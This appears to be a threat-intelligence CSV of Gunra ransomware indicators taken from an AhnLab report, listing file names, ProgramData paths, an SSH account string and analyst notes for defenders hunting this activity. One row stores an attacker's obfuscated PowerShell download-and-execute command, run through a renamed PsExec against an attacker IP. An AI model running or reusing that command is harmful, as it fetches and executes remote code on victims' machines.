schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gunra,artifact--sha256:266668b3e1e34af8d4503782a93308ae844b72098f41a50d609f611e03a3bfd0,observation--sha256:7788bc71b44469ede81fd5f12bbcc126951cc96427cdf31223608d5dfe605aee,command,hotfix.exe -accepteula powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http:'+[char]47+[char]47+'176.65.128[.]26:443'),hotfix.exe -accepteula powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http:'+[char]47+[char]47+'176.65.128.26:443,confirmed,,unknown,unknown,not-stated,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 24}","[""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""payload-download"",""powershell"",""psexec""]",1,false,high,TLP:CLEAR,csv-row,hotfix.exe -accepteula powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http:'+[char]47+[char]47+'176.65.128[.]26:443') command activity--operation-double-barrel-technical-overlap-2026 psexec|powershell|payload-download AhnLab PDF p.55 reproduces this Gunra command and says the obfuscated slash pattern was used in multiple Gunra attack cases.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:bb39b44d86e7f15fd623dc4ac1d40a9510bba043d7b2d6499d110e3380c8ddc6,observation--sha256:491db57b13fb45623dd00843dd1ac81c2ebff55fe424e583ee5a10bc65145af3,file-name,_net.tmp,_net.tmp,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 15}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""dropper-type-trace"",""shared-file-pattern""]",2,true,high,TLP:CLEAR,csv-row,_net.tmp file-name 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 dropper-type-trace|shared-file-pattern AhnLab PDF p.53: logs in the Gunra case showed _net.tmp creation; the relevant file was not collected.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:c95a617a56a1fb135cd1b226c08867ba69b87972e0a77b5b3ddbdd8fe7feedf3,observation--sha256:7b10dc64e914b16d6031edc32b23a0015d115f5db1796f0458b8c448de8b3e28,file-name,administrators_authorized_keys,administrators_authorized_keys,confirmed,,unknown,unknown,not-stated,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 19}","[""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""ssh-authorized-key-file"",""unnamed-cluster-context""]",1,false,high,TLP:CLEAR,csv-row,"administrators_authorized_keys file-name activity--operation-double-barrel-technical-overlap-2026 ssh-authorized-key-file|unnamed-cluster-context AhnLab PDF p.54 names the authorized-key file in the unnamed-cluster side; only the key fingerprint, not this filename, is explicitly confirmed in Gunra logs.",AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:b88d4046975183629673015a7710b3c7d24e9774d91418da5135a6904793079c,observation--sha256:c3b1f3af1c445eb57e6553dad7bca5d1f33370490d117331b745da822d89455b,file-name,hotfix.exe,hotfix.exe,confirmed,,unknown,unknown,not-stated,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 23}","[""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""remote-execution"",""renamed-psexec""]",1,false,high,TLP:CLEAR,csv-row,hotfix.exe file-name activity--operation-double-barrel-technical-overlap-2026 renamed-psexec|remote-execution AhnLab PDF p.55 states hotfix.exe was actually PsExec; no individual execution date is provided.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:077056e6eb0fb1bf65545cbb5d16d58d565738db6b676eb475bc582f84c94bd3,observation--sha256:9fc4de0903dbce7e3685b6f3712cc95cb0163d4777d4b2787198b256db1b7aa1,file-name,inet.tmp,inet.tmp,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 16}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""privilege-escalation-trace"",""shared-file-pattern""]",2,true,high,TLP:CLEAR,csv-row,inet.tmp file-name 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 privilege-escalation-trace|shared-file-pattern AhnLab PDF p.49 and p.53 identifies inet.tmp as a privilege-escalation tool name in the Gunra case.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:f7ca8d542101039f52fd89f659c1bb6fb754d7477a663ddc763b2c87345dcdc1,observation--sha256:219d77021b862487a014f6dc4a569f1ee0be0386ab72c31590ec61bd5ca9b0ed,file-name,net.tmp,net.tmp,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 14}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""dropper-type-trace"",""shared-file-pattern""]",2,true,high,TLP:CLEAR,csv-row,"net.tmp file-name 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 dropper-type-trace|shared-file-pattern AhnLab PDF p.49 and p.53: logs in the Gunra case showed net.tmp creation; the relevant file was not collected, so this is a hunting artifact rather than a sample identity.",AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:8f0ed44ac73e04093f841a0464eef4aded3d58f642f90b406cf617f50fa2e5cc,observation--sha256:51276a570b7ddd6584f3d766cebee3e6a6b3c5d77d1b47a75dea916da9985700,file-path,C:\ProgramData\dpke,C:\ProgramData\dpke,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 28}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""anti-forensic-renamed-path""]",2,true,high,TLP:CLEAR,csv-row,C:\ProgramData\dpke file-path 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 anti-forensic-renamed-path AhnLab PDF p.56 Table 10: net.tmp was renamed to dpke before deletion in a Gunra case.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:9ff330a3c6f739705743df69cc03bf8180daf35631f892d24963096f3347ab78,observation--sha256:4b133af32910f2a1c2751947642b05ad211c549be98ce738e9d19a0b6f017538,file-path,C:\ProgramData\inet.tmp,C:\ProgramData\inet.tmp,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 25}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""anti-forensic-source-path""]",2,true,high,TLP:CLEAR,csv-row,C:\ProgramData\inet.tmp file-path 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 anti-forensic-source-path AhnLab PDF p.56 Table 10 lists this Gunra path before random-four-character rename and deletion.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:986d14eab821a9ae7411173bd11687016c7d70321d575fdca65c82c974d4a796,observation--sha256:c514636be5d56b4888f7362bc2e435b992f77c0ff4533d5d2e4f1b425a6f9595,file-path,C:\ProgramData\lvlu,C:\ProgramData\lvlu,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 29}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""anti-forensic-renamed-path""]",2,true,high,TLP:CLEAR,csv-row,C:\ProgramData\lvlu file-path 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 anti-forensic-renamed-path AhnLab PDF p.56 Table 10: net.tmp was renamed to lvlu before deletion in a Gunra case.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:f191d55d364d53ae3ca79865c4c2ae7a8dfc1e46fd93745637797874d1d4515a,observation--sha256:0c9fec8f71fef5670fdcf1f02d64af704d39c0438463bb73468b731d7bed0fe5,file-path,C:\ProgramData\net.tmp,C:\ProgramData\net.tmp,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 26}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""anti-forensic-source-path""]",2,true,high,TLP:CLEAR,csv-row,C:\ProgramData\net.tmp file-path 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 anti-forensic-source-path AhnLab PDF p.56 Table 10 lists this Gunra path before random-four-character rename and deletion.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:6a75a369ef8033b63247f229b42886d798378dc2e68ab65208f6b8f259e5d714,observation--sha256:41dd331590a0804a0f3d9673569c913807a4e2e1c230290932e70bb2dc8d5dcf,file-path,C:\ProgramData\uwwz,C:\ProgramData\uwwz,confirmed,2026-03-01T00:00:00Z,month,known,column:observed_at,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 27}","[""activity--gunra-operation-double-barrel-incident-2026-03"",""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""anti-forensic-renamed-path""]",2,true,high,TLP:CLEAR,csv-row,C:\ProgramData\uwwz file-path 2026-03 activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026 anti-forensic-renamed-path AhnLab PDF p.56 Table 10: inet.tmp was renamed to uwwz before deletion in the Gunra case.,AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
1.0.0,actor--gunra,artifact--sha256:fd74408ddefb4df70dadcf0e246816aad2f1dc5f473e8885fb769bc1bb88f0d0,observation--sha256:7606718d5be19278e222393e57353e9444f00ee112d7b16d79e8f27f67bf8c7d,other,monitoring-account,monitoring-account,confirmed,,unknown,unknown,not-stated,2026-07-30T00:00:00Z,source--ahnlab-operation-double-barrel-2026,profiles/gunra/osint-observables/ahnlab-operation-double-barrel-2026.csv,"{""row"": 20}","[""activity--operation-double-barrel-technical-overlap-2026""]",[],[],"[""ssh-account"",""unnamed-cluster-context""]",1,false,high,TLP:CLEAR,csv-row,"monitoring-account other activity--operation-double-barrel-technical-overlap-2026 ssh-account|unnamed-cluster-context AhnLab PDF p.54 Figure 35 shows this comment/account string in the attacker public-key file; it is retained as source-scoped context, not as a Gunra identity.",AhnLab公式PDF v1.2のp.49〜65を2026-09-22に直接照合して手動構造化。appendixのGunra sectionに分類されたMD5 2件、URL 1件、IPv4 5件と、本文がGunraでの利用を明記するjshosting.meのURL/domainだけをexact IOCに採用する。process/file/service/argument/SSH-key traceはartifactへ分離し、Brandoor fileは未回収のためhashやmalware identityを推測しない。個別IOCの観測日は原文にないためunknownとし、2026-07-30の公開日を観測日へ転用しない。
